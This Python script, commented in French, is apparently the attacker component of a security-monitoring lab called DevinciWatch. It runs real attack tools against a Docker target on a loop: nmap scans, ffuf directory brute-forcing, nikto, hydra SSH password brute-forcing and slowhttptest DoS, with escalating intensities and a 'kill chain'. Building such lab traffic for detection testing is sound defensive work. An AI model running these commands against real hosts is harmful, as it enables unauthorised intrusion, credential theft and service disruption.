"""DevinciWatch — Attaquant contrôlé (serveur-attacker).

Ce script supporte l'exécution d'attaques réelles (nmap, ffuf, hydra, nikto)
via des appels d'outils, ainsi que des scénarios batch et chain.

Toutes les attaques sont limitées aux cibles Docker autorisées.
"""

from __future__ import annotations

import os
import sys
import time
import subprocess
import json
from typing import Optional

TARGET_HOST = os.getenv("TARGET_HOST", "serveur-endpoint")
ATTACK_INTERVAL = int(os.getenv("ATTACK_INTERVAL", "30"))
INTENSITY = os.getenv("INTENSITY", "low")

# Scénarios disponibles avec outils réels
SCENARIOS = {
    "port_scan": {
        "name": "Port Scan (nmap)",
        "cmd": {
            "low": f"nmap -sS -p 22,80,443 {TARGET_HOST}",
            "medium": f"nmap -sS -p 1-1000 {TARGET_HOST}",
            "high": f"nmap -sS -p- {TARGET_HOST}",
            "stress": f"nmap -sS -p- -T5 {TARGET_HOST}"
        }
    },
    "http_recon": {
        "name": "HTTP Recon (httpx)",
        "cmd": {
            "low": f"httpx -u http://{TARGET_HOST} -silent",
            "medium": f"httpx -u http://{TARGET_HOST} -tech-detect",
            "high": f"httpx -u http://{TARGET_HOST} -probe-all",
            "stress": f"httpx -u http://{TARGET_HOST} -probe-all -threads 100"
        }
    },
    "dir_bruteforce": {
        "name": "Directory Bruteforce (ffuf)",
        "cmd": {
            "low": f"ffuf -u http://{TARGET_HOST}/FUZZ -w /usr/share/wordlists/dirb/small.txt -t 10",
            "medium": f"ffuf -u http://{TARGET_HOST}/FUZZ -w /usr/share/wordlists/dirb/common.txt -t 50",
            "high": f"ffuf -u http://{TARGET_HOST}/FUZZ -w /usr/share/wordlists/dirb/big.txt -t 100",
            "stress": f"ffuf -u http://{TARGET_HOST}/FUZZ -w /usr/share/wordlists/dirb/big.txt -t 200"
        }
    },
    "web_vuln_scan": {
        "name": "Web Vulnerability Scan (nikto)",
        "cmd": {
            "low": f"nikto -h http://{TARGET_HOST} -majors",
            "medium": f"nikto -h http://{TARGET_HOST} -C all",
            "high": f"nikto -h http://{TARGET_HOST} -C all -majors",
            "stress": f"nikto -h http://{TARGET_HOST} -C all -majors -evasion 1"
        }
    },
    "brute_force": {
        "name": "Brute Force (hydra)",
        "cmd": {
            "low": f"hydra -l admin -P /usr/share/wordlists/rockyou.txt.gz {TARGET_HOST} ssh -t 4",
            "medium": f"hydra -l admin -P /usr/share/wordlists/rockyou.txt {TARGET_HOST} ssh -t 8",
            "high": f"hydra -L /tmp/users.txt -P /usr/share/wordlists/rockyou.txt {TARGET_HOST} ssh -t 16",
            "stress": f"hydra -L /tmp/users.txt -P /usr/share/wordlists/rockyou.txt {TARGET_HOST} ssh -t 32"
        }
    },
    "dos_slow": {
        "name": "Slow DoS Test (slowhttptest)",
        "cmd": {
            "low": f"slowhttptest -c 100 -H -i 10 -r 100 -t GET -u http://{TARGET_HOST}",
            "medium": f"slowhttptest -c 500 -H -i 10 -r 200 -t GET -u http://{TARGET_HOST}",
            "high": f"slowhttptest -c 1000 -H -i 5 -r 500 -t GET -u http://{TARGET_HOST}",
            "stress": f"slowhttptest -c 2000 -H -i 1 -r 1000 -t GET -u http://{TARGET_HOST}"
        }
    }
}

# Chains d'attaque complètes
ATTACK_CHAINS = {
    "recon_to_exploit": ["port_scan", "http_recon", "dir_bruteforce"],
    "full_kill_chain": ["port_scan", "http_recon", "dir_bruteforce", "brute_force", "web_vuln_scan"]
}


def run_command(cmd: str, timeout: int = 300) -> dict:
    """Exécute une commande et retourne le résultat."""
    print(f"[attacker] Exécution: {cmd[:100]}...")
    start = time.time()
    
    try:
        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            timeout=timeout
        )
        duration = time.time() - start
        
        output = result.stdout[:2000] if result.stdout else "Pas de sortie"
        if result.stderr:
            output += f"\n[ERR] {result.stderr[:500]}"
        
        print(f"[attacker] Terminé en {duration:.2f}s (code: {result.returncode})")
        return {
            "success": result.returncode == 0,
            "returncode": result.returncode,
            "output": output,
            "duration": round(duration, 2)
        }
    except subprocess.TimeoutExpired:
        print(f"[attacker] Timeout après {timeout}s")
        return {"success": False, "error": "timeout", "duration": timeout}
    except Exception as e:
        print(f"[attacker] Erreur: {e}")
        return {"success": False, "error": str(e)}


def run_scenario(scenario_id: str, intensity: str = "low") -> dict:
    """Lance un scénario d'attaque."""
    if scenario_id not in SCENARIOS:
        return {"error": f"Scénario {scenario_id} inconnu"}
    
    scenario = SCENARIOS[scenario_id]
    cmd = scenario["cmd"].get(intensity, scenario["cmd"]["low"])
    
    print(f"\n[attacker] === Début scénario: {scenario['name']} (intensité: {intensity}) ===")
    result = run_command(cmd)
    print(f"[attacker] === Fin scénario: {scenario['name']} ===\n")
    
    return {"scenario": scenario_id, "name": scenario["name"], "intensity": intensity, **result}


def run_chain(chain_id: str, intensity: str = "low") -> list[dict]:
    """Lance une chaîne d'attaque."""
    if chain_id not in ATTACK_CHAINS:
        return [{"error": f"Chaîne {chain_id} inconnue"}]
    
    chain = ATTACK_CHAINS[chain_id]
    print(f"\n[attacker] === Début chaîne: {chain_id} avec {len(chain)} étapes ===")
    
    results = []
    for step in chain:
        print(f"[attacker] Étape: {step}")
        result = run_scenario(step, intensity)
        results.append(result)
        time.sleep(2)  # Pause entre les étapes
    
    print(f"[attacker] === Fin chaîne: {chain_id} ===\n")
    return results


def run_batch(scenarios: list[str], intensity: str = "low", iterations: int = 1) -> list[dict]:
    """Lance un batch d'attaques."""
    print(f"\n[attacker] === Batch: {len(scenarios)} scénarios, {iterations} itérations ===")
    
    results = []
    for i in range(iterations):
        print(f"\n[attacker] Itération {i+1}/{iterations}")
        for scenario in scenarios:
            result = run_scenario(scenario, intensity)
            results.append({**result, "iteration": i+1})
            time.sleep(1)
    
    print(f"[attacker] === Fin batch ===\n")
    return results


def run_loop() -> None:
    """Boucle principale avec scénarios aléatoires."""
    print(f"[attacker] Démarré — cible={TARGET_HOST}, intervalle={ATTACK_INTERVAL}s, intensité={INTENSITY}")
    time.sleep(15)  # Laisser le SOC et l'endpoint démarrer
    
    scenario_ids = list(SCENARIOS.keys())
    
    while True:
        print(f"\n[attacker] === Nouveau cycle de scénarios ===")
        # Choisir 2-3 scénarios aléatoirement
        import random
        selected = random.sample(scenario_ids, min(3, len(scenario_ids)))
        
        for scenario_id in selected:
            run_scenario(scenario_id, INTENSITY)
            time.sleep(5)
        
        print(f"[attacker] Cycle terminé — pause {ATTACK_INTERVAL}s")
        time.sleep(ATTACK_INTERVAL)


if __name__ == "__main__":
    # Vérifier les arguments de ligne de commande
    if len(sys.argv) > 1:
        mode = sys.argv[1]
        
        if mode == "scenario" and len(sys.argv) > 2:
            scenario_id = sys.argv[2]
            intensity = sys.argv[3] if len(sys.argv) > 3 else "low"
            result = run_scenario(scenario_id, intensity)
            print(json.dumps(result, indent=2))
        
        elif mode == "chain" and len(sys.argv) > 2:
            chain_id = sys.argv[2]
            intensity = sys.argv[3] if len(sys.argv) > 3 else "low"
            results = run_chain(chain_id, intensity)
            print(json.dumps(results, indent=2))
        
        elif mode == "batch":
            scenarios = sys.argv[2].split(",") if len(sys.argv) > 2 else list(SCENARIOS.keys())[:3]
            intensity = sys.argv[3] if len(sys.argv) > 3 else "low"
            iterations = int(sys.argv[4]) if len(sys.argv) > 4 else 1
            results = run_batch(scenarios, intensity, iterations)
            print(json.dumps(results, indent=2))
        
        elif mode == "loop":
            run_loop()
        
        else:
            print(f"Usage: {sys.argv[0]} [scenario|chain|batch|loop] [args...]")
            print(f"Scénarios disponibles: {', '.join(SCENARIOS.keys())}")
            print(f"Chaînes disponibles: {', '.join(ATTACK_CHAINS.keys())}")
    else:
        # Mode par défaut: boucle
        run_loop()
